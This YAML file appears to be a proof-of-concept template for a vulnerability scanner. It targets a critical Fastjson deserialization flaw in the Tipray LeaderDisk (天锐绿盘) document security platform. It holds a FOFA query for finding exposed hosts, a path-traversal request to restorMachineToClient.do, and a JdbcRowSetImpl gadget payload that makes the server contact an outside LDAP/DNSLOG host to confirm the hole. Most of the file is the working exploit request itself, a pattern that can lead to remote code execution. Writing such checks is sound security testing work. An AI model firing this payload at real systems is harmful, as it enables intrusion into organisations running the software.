id: poc-yaml-tipray-dsmp-restormachinetoclient-deserialize
info:
  name: 天锐绿盘文档安全管理平台 restorMachineToClient 反序列化漏洞
  severity: critical
  tags:
  - 反序列化
  - DNSLOG
  finger: 天锐绿盘文档安全管理平台
  fofa: body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"
variables:
  reverse: new_dns_log()
  domain: reverse.Domain()
requests:
- method: POST
  path: /lddsm/service/../ldfbsnodeDocumentController/restorMachineToClient.do
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: diskMatch={"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{.domain}}","autoCommit":true}}&sourceUmId=1&destUmId=1
  expression: status_code == 200 && body == "false" && contains(content_type,"application/json")
    && reverse.Verify()
transport: http
